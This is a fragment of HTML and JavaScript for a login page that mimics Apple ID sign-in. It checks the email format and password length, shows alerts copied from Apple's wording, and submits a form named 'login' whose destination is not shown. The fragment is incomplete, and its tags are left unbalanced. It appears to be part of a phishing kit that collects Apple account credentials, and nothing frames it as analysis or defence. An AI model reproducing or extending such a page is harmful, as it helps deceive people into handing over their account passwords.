	<script>
		function isemail(email) { 
			var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
			return re.test(email);
		}
		function check() {
			if (!(isemail($('.user').val()))) {
				alert("Double-check that you typed a valid Apple ID.");
				return false;
			}
			if (document.getElementById('pass').value.length<4) {
				alert("Double-check that you have typed the right password.");
				return false;
			}
			return true;
		}
		var loaded = false;
		var time = 10000;
		$(function() {
			$(window).load(function() {
			   loaded = true;
			   if (isemail($('.user').val())) $('.pass').focus();
			});
			setTimeout(function() { 
				if(!loaded) {
					window.location.reload();
				}  
			},time);
		});
	</script>

<body style="visibility:hidden;" onload="$('body').css('visibility','')">
	<center>

			<input type="submit" style="height: 0px; width: 0px; border: none; padding: 0px;" hidefocus="true" />
			<div class="button submit" onclick="javascript:if(check()){document.getElementById('login').submit();}"></div>
		</div>
